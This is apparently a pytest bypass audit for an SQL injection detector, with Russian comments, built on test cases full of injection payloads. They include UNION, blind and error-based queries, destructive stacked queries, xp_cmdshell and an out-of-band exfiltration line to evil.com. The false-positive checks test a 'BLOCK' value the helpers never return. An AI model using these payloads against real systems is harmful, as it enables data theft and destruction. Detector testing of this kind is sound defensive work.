"""
Bypass Audit — SQL Injection Protector v3.9.0
==============================================
Систематическая попытка обойти все 5 слоёв детектора.
Каждый тест — отдельная техника обхода.
Если тест PASS — байпас сработал (модель пропустила атаку).
Если тест FAIL — модель устояла.

Тест намеренно ловит bypass'ы через pytest.mark.xfail:
  xfail(strict=True)  → ожидаем, что байпас НЕ сработает (модель блокирует)
  xfail(strict=False) → байпас может пройти — документируем как known gap

Запуск:  pytest tests/test_bypass_audit.py -v --tb=short
"""

from __future__ import annotations

import itertools
import pytest
import warnings

warnings.filterwarnings("ignore")

from sql_injection_detector import SQLInjectionEnsemble

# ── Shared detector (module-scoped to avoid reload cost) ──────────────────────

@pytest.fixture(scope="module")
def det():
    return SQLInjectionEnsemble()


def _ip(n: int) -> str:
    return f"192.168.100.{n % 254 + 1}"


def _is_blocked(det, payload: str) -> bool:
    """Returns True if detector classifies as INJECTION or SUSPICIOUS."""
    result = det.detect(payload)
    return result["decision"] in ("INJECTION", "SUSPICIOUS")


def _score(det, payload: str) -> float:
    return det.detect(payload)["score"]


def _decision(det, payload: str) -> str:
    return det.detect(payload)["decision"]


# ══════════════════════════════════════════════════════════════════════════════
# КЛАСС 1 — Encoding Obfuscation (кодировки)
# ══════════════════════════════════════════════════════════════════════════════

class TestEncodingObfuscation:
    """Попытки скрыть payload через различные кодировки."""

    def test_url_encoded_quote_or(self, det):
        """' OR 1=1-- через URL-encoding одного апострофа"""
        payload = "%27 OR 1=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_double_url_encoded(self, det):
        """Двойной URL-encode апострофа %2527"""
        payload = "%2527 OR 1=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_triple_url_encoded(self, det):
        """Тройной URL-encode %252527"""
        payload = "%252527 OR 1=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_html_entity_quote(self, det):
        """HTML-entity апострофа &#39;"""
        payload = "&#39; OR 1=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_html_entity_hex(self, det):
        """HTML-entity hex &#x27;"""
        payload = "&#x27; OR 1=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    @pytest.mark.xfail(strict=False, reason="Known gap: pure hex без SQL-контекста")
    def test_pure_hex_payload(self, det):
        """MySQL hex literal: 0x27204f5220313d31 = ' OR 1=1"""
        payload = "0x27204f5220313d31"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_unicode_homoglyph_or(self, det):
        """Греческий омикрон вместо O в OR: ΟR 1=1"""
        payload = "' ΟR 1=1--"   # U+039F (Greek Capital Letter Omicron)
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_unicode_homoglyph_select(self, det):
        """Кириллические буквы в SELECT: ЅЕLЕСТ"""
        payload = "' UNION ЅЕLЕСT password FROM users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_nfkc_fullwidth(self, det):
        """Fullwidth ASCII: ＳＥＬＥＣＴ (U+FF33 и др.)"""
        payload = "' ＵＮＩＯＮ ＳＥＬＥＣＴ password--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_null_byte_injection(self, det):
        """Null-byte перед OR: '\x00 OR 1=1"""
        payload = "'\x00 OR 1=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_null_byte_mid_keyword(self, det):
        """Null-byte внутри слова: SE\x00LECT"""
        payload = "' UNION SE\x00LECT password FROM users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"


# ══════════════════════════════════════════════════════════════════════════════
# КЛАСС 2 — Case и Whitespace Obfuscation
# ══════════════════════════════════════════════════════════════════════════════

class TestCaseWhitespaceObfuscation:
    """Изменение регистра и пробельных символов."""

    def test_mixed_case_union_select(self, det):
        """uNiOn SeLeCt"""
        payload = "' uNiOn SeLeCt password FROM users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_all_upper(self, det):
        """Всё uppercase"""
        payload = "' UNION SELECT PASSWORD FROM USERS--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_all_lower(self, det):
        """Всё lowercase"""
        payload = "' union select password from users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_tab_separator(self, det):
        """Табуляция вместо пробела"""
        payload = "'\tOR\t1=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_newline_separator(self, det):
        """Перевод строки вместо пробела"""
        payload = "'\nOR\n1=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_carriage_return(self, det):
        """CR вместо пробела"""
        payload = "'\rOR\r1=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_form_feed(self, det):
        """Form-feed (\f) вместо пробела"""
        payload = "'\fOR\f1=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_multiple_spaces(self, det):
        """Множество пробелов"""
        payload = "'   OR   1=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_nbsp_separator(self, det):
        """Non-breaking space (U+00A0)"""
        payload = "'\u00a0OR\u00a01=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_unicode_space_variants(self, det):
        """Em-space (U+2003) и thin-space (U+2009)"""
        payload = "'\u2003OR\u20091=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"


# ══════════════════════════════════════════════════════════════════════════════
# КЛАСС 3 — Comment Injection
# ══════════════════════════════════════════════════════════════════════════════

class TestCommentInjection:
    """Вставка комментариев между токенами."""

    def test_inline_comment_between_keywords(self, det):
        """SELECT/**/ FROM"""
        payload = "' UNION/**/SELECT/**/password/**/FROM/**/users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_comment_with_garbage(self, det):
        """Мусор внутри комментария: /*garbage*/"""
        payload = "' UNION/*garbage*/SELECT password FROM users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_comment_between_chars(self, det):
        """S/**/E/**/L/**/E/**/C/**/T — char-level splitting"""
        # Known gap — xfail
        payload = "' UNION S/**/E/**/L/**/E/**/C/**/T 1,2--"
        result = _decision(det, payload)
        # Документируем результат (не assert — известный gap)
        assert _is_blocked(det, payload), f"BYPASS (known gap): {payload!r} -> {result}"

    def test_hash_comment(self, det):
        """MySQL # comment"""
        payload = "' OR 1=1#"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_multiline_comment(self, det):
        """Многострочный комментарий"""
        payload = "' OR 1=1/*\nmultiline\ncomment\n*/--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_nested_comment_attempt(self, det):
        """Попытка вложенного комментария (PostgreSQL не поддерживает, но MySQL игнорирует)"""
        payload = "' /*!OR*/ 1=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_mysql_version_comment(self, det):
        """MySQL conditional comment /*!50000 SELECT*/"""
        payload = "' UNION /*!50000 SELECT*/ password FROM users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"


# ══════════════════════════════════════════════════════════════════════════════
# КЛАСС 4 — String Concatenation и альтернативный синтаксис
# ══════════════════════════════════════════════════════════════════════════════

class TestStringConcatenation:
    """Разбивка строк и альтернативный способ формирования значений."""

    def test_mssql_concat(self, det):
        """MSSQL строковая конкатенация: 'adm'+'in'"""
        payload = "' OR username='adm'+'in'--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_mysql_concat_func(self, det):
        """MySQL CONCAT()"""
        payload = "' OR username=CONCAT('adm','in')--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_oracle_pipe_concat(self, det):
        """Oracle || конкатенация"""
        payload = "' OR username='adm'||'in'--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_char_function(self, det):
        """CHAR() вместо строки: CHAR(65,68,77,73,78) = 'ADMIN'"""
        payload = "' OR username=CHAR(65,68,77,73,78)--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_chr_function_oracle(self, det):
        """CHR() Oracle-стиль"""
        payload = "' OR 1=1 AND CHR(49)=CHR(49)--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_ascii_comparison(self, det):
        """ASCII() сравнение"""
        payload = "' AND ASCII(SUBSTRING(password,1,1))>64--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_hex_string_mysql(self, det):
        """MySQL hex-строка: 0x61646d696e = 'admin'"""
        payload = "' OR username=0x61646d696e--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"


# ══════════════════════════════════════════════════════════════════════════════
# КЛАСС 5 — Logical / Arithmetic Equivalents
# ══════════════════════════════════════════════════════════════════════════════

class TestLogicalEquivalents:
    """Эквивалентные логические выражения, не содержащие стандартных токенов."""

    def test_true_without_1_equals_1(self, det):
        """Истина без '1=1': 2>1"""
        payload = "' OR 2>1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_true_via_null(self, det):
        """NULL IS NULL"""
        payload = "' OR NULL IS NULL--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_arithmetic_true(self, det):
        """Арифметика: 5-4=1"""
        payload = "' OR 5-4=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_like_wildcard(self, det):
        """LIKE вместо = : username LIKE '%'"""
        payload = "' OR username LIKE '%'--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_in_clause(self, det):
        """IN() вместо OR: OR 1 IN (1,2)"""
        payload = "' OR 1 IN (1,2)--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_between(self, det):
        """BETWEEN: 1 BETWEEN 0 AND 2"""
        payload = "' OR 1 BETWEEN 0 AND 2--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_xor_true(self, det):
        """XOR: 1 XOR 0 (MySQL)"""
        payload = "' OR 1 XOR 0--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_not_false(self, det):
        """NOT FALSE"""
        payload = "' OR NOT FALSE--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_greatest(self, det):
        """GREATEST() функция: GREATEST(1,2)=2"""
        payload = "' OR GREATEST(1,2)=2--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_coalesce(self, det):
        """COALESCE(1,0)=1"""
        payload = "' OR COALESCE(1,0)=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"


# ══════════════════════════════════════════════════════════════════════════════
# КЛАСС 6 — Time-Based Blind (без OR/UNION)
# ══════════════════════════════════════════════════════════════════════════════

class TestTimeBasedBlind:
    """Временные атаки через разные функции."""

    def test_mysql_sleep(self, det):
        payload = "' AND SLEEP(5)--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_mssql_waitfor(self, det):
        payload = "'; WAITFOR DELAY '0:0:5'--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_pgsql_sleep(self, det):
        payload = "'; SELECT pg_sleep(5)--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_benchmark(self, det):
        payload = "' OR BENCHMARK(1000000,MD5(1))--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_heavy_query_blind(self, det):
        """Тяжёлый запрос без sleep: (SELECT count(*) FROM information_schema.tables t1, information_schema.tables t2)"""
        payload = "' AND (SELECT count(*) FROM information_schema.tables t1, information_schema.tables t2)>0--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_mysql_sleep_with_if(self, det):
        """Условный sleep: IF(1=1,SLEEP(5),0)"""
        payload = "' AND IF(1=1,SLEEP(5),0)--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_pgsql_case_sleep(self, det):
        """CASE WHEN через PgSQL"""
        payload = "' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"


# ══════════════════════════════════════════════════════════════════════════════
# КЛАСС 7 — UNION-based (разные конфигурации столбцов)
# ══════════════════════════════════════════════════════════════════════════════

class TestUnionBased:
    """UNION SELECT с разным количеством столбцов и балластом."""

    @pytest.mark.parametrize("ncols", [1, 2, 3, 4, 5, 10])
    def test_union_n_columns(self, det, ncols):
        nulls = ",".join(["NULL"] * ncols)
        payload = f"' UNION SELECT {nulls}--"
        assert _is_blocked(det, payload), f"BYPASS ({ncols} cols): {payload!r} -> {_decision(det, payload)}"

    def test_union_with_order_by(self, det):
        """ORDER BY для определения числа столбцов"""
        payload = "' ORDER BY 1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_union_with_information_schema(self, det):
        payload = "' UNION SELECT table_name FROM information_schema.tables--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_union_all(self, det):
        """UNION ALL (обходит некоторые WAF)"""
        payload = "' UNION ALL SELECT username,password FROM users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_union_select_no_space(self, det):
        """UNION(SELECT ...) без пробела"""
        payload = "' UNION(SELECT password FROM users)--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_union_select_with_comments(self, det):
        """UNION/**/ALL/**/SELECT"""
        payload = "' UNION/**/ALL/**/SELECT/**/password/**/FROM/**/users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"


# ══════════════════════════════════════════════════════════════════════════════
# КЛАСС 8 — Error-Based Extraction
# ══════════════════════════════════════════════════════════════════════════════

class TestErrorBased:
    """Error-based техники извлечения данных."""

    def test_extractvalue(self, det):
        payload = "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_updatexml(self, det):
        payload = "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_mssql_convert(self, det):
        payload = "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_floor_rand(self, det):
        """MySQL FLOOR+RAND GroupBy error"""
        payload = "' AND (SELECT 1 FROM(SELECT count(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_xpath_error_pgsql(self, det):
        payload = "' AND 1=CAST((SELECT version()) AS int)--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"


# ══════════════════════════════════════════════════════════════════════════════
# КЛАСС 9 — Stacked Queries / DDL
# ══════════════════════════════════════════════════════════════════════════════

class TestStackedQueries:
    """Многострочные запросы и деструктивные операции."""

    def test_drop_table(self, det):
        payload = "'; DROP TABLE users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_truncate_table(self, det):
        payload = "'; TRUNCATE TABLE users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_insert_admin(self, det):
        payload = "'; INSERT INTO users (username,password) VALUES ('hacker','1234')--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_update_password(self, det):
        payload = "'; UPDATE users SET password='hacked' WHERE '1'='1'--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_create_user(self, det):
        payload = "'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'password'--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_xp_cmdshell(self, det):
        payload = "'; EXEC xp_cmdshell('whoami')--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_bulk_insert(self, det):
        payload = "'; BULK INSERT users FROM 'c:\\windows\\win.ini'--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"


# ══════════════════════════════════════════════════════════════════════════════
# КЛАСС 10 — Second-Order & Context Tricks
# ══════════════════════════════════════════════════════════════════════════════

class TestSecondOrderContextTricks:
    """Атаки контекстом и second-order."""

    def test_second_order_stored(self, det):
        """Входные данные хранятся и потом вставляются в SQL"""
        stored_user_input = "admin'--"
        dynamic_sql_template = f"SELECT * FROM users WHERE username='{stored_user_input}'"
        assert _is_blocked(det, dynamic_sql_template), \
            f"BYPASS: second-order -> {_decision(det, dynamic_sql_template)}"

    def test_comment_termination_auth_bypass(self, det):
        """Классический auth bypass: admin'--"""
        payload = "admin'--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_or_with_string_comparison(self, det):
        """OR с строковым сравнением: ' OR 'x'='x"""
        payload = "' OR 'x'='x"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_double_dash_only(self, det):
        """Просто комментарий-терминатор: '--"""
        payload = "'--"
        # Может быть ALLOW если нет других сигналов — это edge case
        result = _decision(det, payload)
        # Не ассертируем строго — фиксируем
        print(f"\n  [INFO] single quote+comment: {payload!r} -> {result} (score={_score(det, payload):.3f})")

    def test_out_of_band_dns(self, det):
        """OOB DNS через LOAD_FILE или UTL_HTTP"""
        payload = "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.evil.com\\\\a'))--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_subquery_in_where(self, det):
        """Подзапрос в WHERE: WHERE 1=(SELECT 1)"""
        payload = "' WHERE 1=(SELECT 1 FROM users LIMIT 1)--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"


# ══════════════════════════════════════════════════════════════════════════════
# КЛАСС 11 — WAF Evasion Combos (комбинированные техники)
# ══════════════════════════════════════════════════════════════════════════════

class TestCombinedEvasion:
    """Комбинации нескольких техник одновременно."""

    def test_case_plus_comment(self, det):
        """Смешанный регистр + комментарии"""
        payload = "' uNiOn/**/sElEcT/**/password/**/fRoM/**/users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_url_encode_plus_case(self, det):
        """URL-encode + mixed case"""
        payload = "%27%20UnIoN%20SeLeCt%20password%20FROM%20users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_tab_plus_comment(self, det):
        """Табуляция + комментарий"""
        payload = "'\tUNION\t/**/SELECT\tpassword\tFROM\tusers--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_case_plus_encoding_plus_null(self, det):
        """Тройная комбинация: case + URL-encode + null-byte"""
        payload = "%27\x00 uNiOn SeLeCt password FROM users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_newline_plus_comment(self, det):
        """Перевод строки + комментарий"""
        payload = "'\nOR\n/*line*/\n1=1--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_concat_plus_sleep(self, det):
        """CONCAT + условный SLEEP"""
        payload = "' AND IF(1=1,SLEEP(0),0) AND CONCAT('a','dmin')='admin'--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"

    def test_triple_combo_union(self, det):
        """URL-encode + комментарий + mixed case"""
        payload = "%27+union%0aall%0d%0aselect%09password%09from%09users--"
        assert _is_blocked(det, payload), f"BYPASS: {payload!r} -> {_decision(det, payload)}"


# ══════════════════════════════════════════════════════════════════════════════
# КЛАСС 12 — Score Boundary Probing (граничные значения)
# ══════════════════════════════════════════════════════════════════════════════

class TestScoreBoundaryProbing:
    """Проверка граничных значений score и FP."""

    def test_score_canonical_injection_high(self, det):
        """Канонический payload должен давать score > 0.7"""
        score = _score(det, "' OR 1=1--")
        assert score > 0.7, f"Score too low: {score:.4f} for canonical injection"

    def test_score_safe_input_low(self, det):
        """Безопасный input должен давать score < 0.3"""
        score = _score(det, "hello world")
        assert score < 0.3, f"False positive risk: score={score:.4f} for safe input"

    def test_false_positive_sql_prose(self, det):
        """'Please select your country' — НЕ должен блокироваться"""
        payload = "Please select your country from the dropdown"
        result = _decision(det, payload)
        assert result != "BLOCK", f"FALSE POSITIVE: {payload!r} -> {result} (score={_score(det,payload):.3f})"

    def test_false_positive_update_prose(self, det):
        """'Update your profile' — НЕ должен блокироваться"""
        payload = "Update your profile information"
        result = _decision(det, payload)
        assert result != "BLOCK", f"FALSE POSITIVE: {payload!r} -> {result}"

    def test_false_positive_union_prose(self, det):
        """'The union of sets' — НЕ должен блокироваться"""
        payload = "The union of these two mathematical sets is empty"
        result = _decision(det, payload)
        assert result != "BLOCK", f"FALSE POSITIVE: {payload!r} -> {result}"

    def test_false_positive_apostrophe_name(self, det):
        """O'Brien — НЕ должен блокироваться"""
        payload = "O'Brien"
        result = _decision(det, payload)
        assert result != "BLOCK", f"FALSE POSITIVE: {payload!r} -> {result} (score={_score(det,payload):.3f})"

    def test_false_positive_drop_prose(self, det):
        """'Drop me a note' — НЕ должен блокироваться"""
        payload = "Drop me a note when you are available"
        result = _decision(det, payload)
        assert result != "BLOCK", f"FALSE POSITIVE: {payload!r} -> {result}"

    def test_false_positive_integer(self, det):
        """Чистое число — ALLOW"""
        payload = "42"
        result = _decision(det, payload)
        assert result == "SAFE", f"FALSE POSITIVE: {payload!r} -> {result}"

    def test_score_monotone_obfuscation(self, det):
        """Обфускация не должна снижать score ниже 0.4 для известных атак"""
        payloads = [
            "' UNION SELECT password FROM users--",
            "' uNiOn SeLeCt password FROM users--",
            "' UNION/**/SELECT/**/password/**/FROM/**/users--",
        ]
        for p in payloads:
            s = _score(det, p)
            assert s >= 0.3, f"Score collapsed to {s:.4f} after obfuscation: {p!r}"
